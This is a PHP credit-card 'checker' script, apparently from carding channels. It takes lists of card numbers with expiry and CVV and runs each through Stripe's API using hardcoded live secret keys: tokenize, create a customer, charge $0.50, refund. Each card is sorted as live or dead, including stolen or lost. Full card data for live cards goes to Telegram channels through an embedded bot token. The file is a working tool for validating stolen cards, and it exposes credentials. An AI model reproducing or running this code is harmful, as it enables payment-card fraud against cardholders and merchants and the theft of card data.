<?php 

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$lastfour = substr($cc, -4);


function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}




if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}




//put you sk_live keys here
$skeys = array(
//1 => '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',
3 =>  '',
//4 => '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',
//5 => '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',
);
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];


#==================================[ TOKENS ]==================================#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=".$cc."&card[exp_month]=".$mes."&card[exp_year]=".$ano."&card[cvc]=".$cvv."");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch);
$s = json_decode($result1, true);

$token = $s['id'];


#==================================[ CUSTOMER ]==================================#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result2 = curl_exec($ch);
$cus = json_decode($result2, true);
$token3 = $cus['id'];
$message = trim(strip_tags(getStr($result2,'"message": "','"')));
$cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));
$declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));



#==================================[ CHARGES ]==================================#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$result3 = curl_exec($ch);

$char = json_decode($result3, true);
$chtoken = trim(strip_tags(getStr($result3,' "id": "','"')));
$chargetoken = $char['charge'];
$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));
$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
$networkstatus = trim(strip_tags(getStr($result3,'"network_status": "','"')));
$risklevel = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
$seller_message = trim(strip_tags(getStr($result3,'"seller_message": "','"')));


$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);

#----------------------Refund

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$result4 = curl_exec($ch);

///////////////////////////////////////// BIN LOOKUP


#==================================[ Bin ]==================================#
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $type - $brand - $country $emoji"; ///CREDIT - MASTERCARD - UNITED STATES 🇺🇸
#==================================[ RESPONSES ]==================================#

if(strpos($result3, '"seller_message": "Payment complete."' )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='success'><font class='badge badge-success'>CVV MATCH [  Charged 0.5$ ✅  CHECKER BY @Wantednoob</i></font> <font class='badge badge-success'>[Info: ]</i></font><br>";
      $tg = 
"✅ 𝗟𝗜𝗩𝗘 𝗖𝗛𝗔𝗥𝗚𝗘𝗗

𝗖𝗮𝗿𝗱 ➔ <code>".$lista."</code>

𝗣𝗿𝗼𝘅𝘆 ➔ connected
 
𝗕𝗼𝘁 𝗕𝘆 <a href='https://t.me/Wantednoob'>Wanted Noob</a>";


$apiToken = "5336602006:AAE0kDmoWFQ9-xUsC8fO84sJ53mHOdInSAI";
               $forward3 = ['chat_id' => '-1001567499659','text' => $tg,'parse_mode' => 'HTML' ];
               $forward3 = ['chat_id' => '-1001557935515','text' => $tg,'parse_mode' => 'HTML' ];

$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
                        $response3 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward3) );
}
elseif ((strpos($result3,'"cvc_check": "pass"')) || (strpos($result3,'"cvc_check": "pass"'))){
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='success'><font class='badge badge-success'>CVV MATCH [ CVV PASS ]</i></font> <font class='badge badge-success'>[Info: $bindata1]</i></font><br>";
  }
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds')) || (strpos($result3, 'Your card has insufficient funds.')) || (strpos($result3, 'insufficient_funds'))){
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='success'><font class='badge badge-primary'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-success'>[Info:$bindata1]</i></font><br>";
  }

elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect.")) || (strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc")) || (strpos($result3, "The card's security code is incorrect."))){
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='success'><font class='badge badge-success'>CCN MATCHED</i></font> <font class='badge badge-success'>[Info: $bindata1]</i></font><br>";
  }
elseif ((strpos($result3, "fraudulent" )) || (strpos($result2, "fraudulent" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='success'><font class='badge badge-info'>FRAUDLENT</i></font> <font class='badge badge-danger'>[Info: $bank - $type - $country]</i></font><br>";
  }

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number')) || (strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number')) || (strpos($result3, 'The card number is incorrect.')) || (strpos($result3, 'Your card number is incorrect.')) || (strpos($result3, 'incorrect_number'))){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }

elseif(strpos($result2,"invalid_account")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INVALID ACCOUNT</i></font><br>";
  }

elseif ((strpos($result2, "lost_card" )) || (strpos($result3, "lost_card" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>LOST CARD</i></font><br>";
  }

elseif ((strpos($result2, "stolen_card" )) || (strpos($result3, "stolen_card" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-dark'>STOLEN CARD</i></font><br>";
  }

elseif (strpos($result1, "card_not_supported" )) {
  echo "<font size=2 color='white'><font class='badge badge-dark'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-dark'>CARD NOT SUPPORTED</i></font><br>";
  }

elseif ((strpos($result2, "pickup_card" )) || (strpos($result3, "pickup_card" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-dark'>PICKUP CARD</i></font><br>";
  }

elseif ((strpos($result2, "Your card has expired." )) || (strpos($result3, "Your card has expired." ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-dark'>EXPIRED CARD</i></font><br>";
  }

elseif ((strpos($result2, "transaction_not_allowed" )) || (strpos($result3, "transaction_not_allowed" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-light'>TRANSACTION NOT ALLOWED</i></font><br>";
  }

elseif ((strpos($result2, "processing_error" )) || (strpos($result3, "processing_error" ))) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>PROCESSING ERROR</i></font><br>";
  }

elseif ((strpos($result2, "service_not_allowed" )) || (strpos($result3, "service_not_allowed" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i></font><br>";
  }

elseif ((strpos($result2, "do_not_honor" )) || (strpos($result3, "do_not_honor" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>DO NOT HONOR</i></font><br>";
  }

elseif ((strpos($result1, "generic_decline" )) || (strpos($result2, "generic_decline" )) || (strpos($result3, "generic_decline" ))) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>GENERIC ERROR</i></font><br>";
  }

elseif ((strpos($result1, "rate_limit" )) || (strpos($result2, "rate_limit" )) || (strpos($result3, "rate_limit" ))) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>RATE LIMITED</i></font><br>";
  }

elseif(strpos($result2,'"cvc_check": "unchecked"')){
  echo "<font size=2 color='white'><font class='badge badge-dark'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CVC CHECK => UNCHECKED</i></font><br>";
  }

elseif(strpos($result2,'"cvc_check": "fail"')){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CVC CHECK => FAIL</i></font><br>";
  }

elseif(strpos($result2,'"cvc_check": "unavailable"')){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CVC CHECK => UNAVAILABLE</i></font><br>";
  }

else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>".$message."</i></font><br>";
  }

// echo "[R2] => ".$result2."<br>";
// echo "[R3] => ".$result3."<br>";

curl_close($curl);
ob_flush();

#======================================================[@Dr34m_C4t]=============================================================#
?>
